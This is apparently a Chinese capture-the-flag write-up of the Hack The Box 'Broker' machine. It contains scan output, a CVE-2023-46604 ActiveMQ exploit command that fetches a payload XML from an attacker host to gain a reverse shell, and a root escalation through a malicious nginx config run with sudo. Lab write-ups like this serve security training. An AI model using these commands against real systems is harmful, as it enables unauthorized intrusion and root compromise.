---
layout: post
title: HTB——Broker
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Broker/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-14 23:50:51] [INFO] 暴力破解线程数: 1
[2025-04-14 23:50:51] [INFO] 开始信息扫描
[2025-04-14 23:50:51] [INFO] 最终有效主机数量: 1
[2025-04-14 23:50:51] [INFO] 开始主机扫描
[2025-04-14 23:50:51] [INFO] 有效端口数量: 233
[2025-04-14 23:50:51] [SUCCESS] 端口开放 10.129.236.88:80
[2025-04-14 23:50:51] [SUCCESS] 端口开放 10.129.236.88:22
[2025-04-14 23:50:51] [SUCCESS] 端口开放 10.129.236.88:5672
[2025-04-14 23:50:52] [SUCCESS] 服务识别 10.129.236.88:22 => [ssh] 版本:8.9p1 Ubuntu 3ubuntu0.4 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4.]
[2025-04-14 23:50:52] [SUCCESS] 端口开放 10.129.236.88:8161
[2025-04-14 23:50:52] [SUCCESS] 端口开放 10.129.236.88:61616
[2025-04-14 23:50:52] [SUCCESS] 服务识别 10.129.236.88:61616 => [apachemq] 产品:ActiveMQ OpenWire transport
[2025-04-14 23:50:57] [SUCCESS] 服务识别 10.129.236.88:80 => [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu                                                                                 
[2025-04-14 23:51:02] [SUCCESS] 服务识别 10.129.236.88:5672 => 
[2025-04-14 23:51:02] [SUCCESS] 服务识别 10.129.236.88:8161 => [http]
[2025-04-14 23:51:02] [INFO] 存活端口数量: 5
[2025-04-14 23:51:02] [INFO] 开始漏洞扫描
[2025-04-14 23:51:02] [INFO] 加载的插件: rabbitmq, ssh, webpoc, webtitle
[2025-04-14 23:51:02] [SUCCESS] 网站标题 http://10.129.236.88      状态码:401 长度:447    标题:Error 401 Unauthorized                                                                             
[2025-04-14 23:51:03] [SUCCESS] 网站标题 http://10.129.236.88:8161 状态码:401 长度:447    标题:Error 401 Unauthorized                                                                             
[2025-04-14 23:51:04] [SUCCESS] 目标: http://10.129.236.88:8161
  漏洞类型: poc-yaml-activemq-default-password                                                   
  漏洞名称:                                                                                      
  详细信息:                                                                                      
        author:pa55w0rd(www.pa55w0rd.online/)                                                    
        links:https://blog.csdn.net/ge00111/article/details/72765210                             
[2025-04-14 23:51:04] [SUCCESS] 目标: http://10.129.236.88:80
  漏洞类型: poc-yaml-activemq-default-password                                                   
  漏洞名称:                                                                                      
  详细信息:                                                                                      
        author:pa55w0rd(www.pa55w0rd.online/)                                                    
        links:https://blog.csdn.net/ge00111/article/details/72765210                             
[2025-04-14 23:52:43] [SUCCESS] 扫描已完成: 6/6

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[23:52:29] [INFO] Start IpScan:10.129.236.88
[23:52:29] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[23:52:30] [+] 10.129.236.88:22 open
[23:52:30] [+] 10.129.236.88:80 open
[23:52:31] [+] [TCP/SSH]  [OpenSSH 8.9p1 Ubuntu 3ubuntu0.4] 10.129.236.88:22 [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4]
[23:52:31] [INFO] start SSH check 10.129.236.88:22
[23:52:31] [+] 开始 SshScan 任务: SSH://10.129.236.88:22
[23:52:31] [+] 10.129.236.88:1883 open
[23:52:31] [+] [TCP/HTTP] [401] [nginx/1.18.0 (Ubuntu)][Apache-ActiveMQ] http://10.129.236.88:80 [Error 401 Unauthorized]
[23:52:31] [+] [TCP/MQTT]   10.129.236.88:1883 [.]
端口扫描   5% [█░░░░░░░░░░░░░░░░░░░] (3514/65535) [0s:1s][23:52:31] [INFO] start MQTT check 10.129.236.88:1883
[23:52:31] [+] 开始 MqttScan 任务: MQTT://10.129.236.88:1883
[23:52:32] [+] 10.129.236.88:5672 open
端口扫描  12% [██░░░░░░░░░░░░░░░░░░] (8173/65535) [0s:4s][23:52:32] [+] 10.129.236.88:8161 open
[23:52:36] [+] [TCP/AMQP]   10.129.236.88:5672 [AMQP.AMQP.S.@p.`.`.S.S.S.M.amqp:decode-error 7Conn]                                                                   
[23:52:36] [+] 10.129.236.88:36943 open
[23:52:38] [+] [TCP/UNKNOWN]   10.129.236.88:36943 
[23:52:39] [+] [TCP/HTTP] [401] [Eclipse-Jetty][Jetty(9.4.39.v20210325)][jetty-web-server][Apache-ActiveMQ][Jetty 9.4.39.v20210325] http://10.129.236.88:8161 [Error 401 Unauthorized]                                                                   
[23:52:39] [+] 10.129.236.88:61613 open                   
[23:52:39] [+] 10.129.236.88:61616 open
[23:52:39] [+] 10.129.236.88:61614 open
[23:52:40] [+] [TCP/APACHEMQ]   10.129.236.88:61616 [.< ActiveMQ.*.TcpNoDelayEnabled.SizePrefixDisabled]                                                              
                                                          
[23:52:40] [+] alive ports is: 9
[23:52:40] [+] Ip扫描结束:10.129.236.88
[23:52:40] [INFO] Start UrlScan:http://10.129.236.88:80
http://10.129.236.88:8161
[23:52:41] [+] [TCP/HTTP] [401] [Eclipse-Jetty][Jetty(9.4.39.v20210325)][Apache-ActiveMQ][jetty-web-server] http://10.129.236.88:8161 [Error 401 Unauthorized]        
[23:52:41] [+] [TCP/HTTP] [401] [nginx/1.18.0 (Ubuntu)][Apache-ActiveMQ] http://10.129.236.88:80 [Error 401 Unauthorized]
                                                 
[23:52:41] [+] Url扫描结束:http://10.129.236.88:80
http://10.129.236.88:8161
[23:52:41] [+] 项目任务完成:Default, Timeuse：11.950903851
[23:52:41] [+] 扫描结束,耗时: 12.60097083s
```

---

# 0x02 CVE-2023-46604复现

发现`fscan`爆出了默认账密。我们尝试以此为突破点进行渗透。默认账密为`admin:admin`,登陆后查看`ActiveMQ`的版本号为`5.15.15`，下面的`copyright`只到2020年，估计就是用CVE打的了。上网检索CVE，查看到`CVE-2023-46604`

- [rootsecdev/CVE-2023-46604: Achieving a Reverse Shell Exploit for Apache ActiveMQ (CVE_2023-46604)](https://github.com/rootsecdev/CVE-2023-46604)

使用此项目，在本地起一个python HTTP服务，并适当修改poc开启监听，即可获得一个shell

```bash
┌──(root㉿kali)-[/home/kali/HTB/Broker/CVE-2023-46604]
└─# go run main.go -i 10.129.236.88 -p 61616 -u http://10.10.16.7:8089/poc-linux.xml 
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.129.236.88:61616
[*] XML URL: http://10.10.16.7:8089/poc-linux.xml

[*] Sending packet: 000000771f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010024687474703a2f2f31302e31302e31362e373a383038392f706f632d6c696e75782e786d6c
```

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Broker/02.png?raw=true)

---

# 0x03 nginx提权

使用msf做一下持久化，我们再来查看提权环节。

```bash
activemq@broker:~$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

发现可使用的特权是`nginx`，有两个路径可获得`root.txt`:1.以写一个以root身份在`/root`文件夹搭建的nginx服务，通过PUT方法覆写root用户的私钥文件，以此来登录；2.直接以root身份在`root`文件夹下搭一个可访问的nginx服务，直接访问`root.txt`即可。这里我们尝试第二种方法。

```bash
user root;
events {
   worker_connections 1234;
}
http {
    server {
        listen 1234;
        root /root;
        autoindex on;
    }
}
```

写这样一个`conf`文件，上传至靶机并将`nginx`配置文件重新指向此恶意`conf`文件。

```bash
sudo /usr/sbin/nginx -c /home/activemq/evil/evil2.conf
```

然后我们就可以通过curl访问到`root.txt`了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Broker/03.png?raw=true)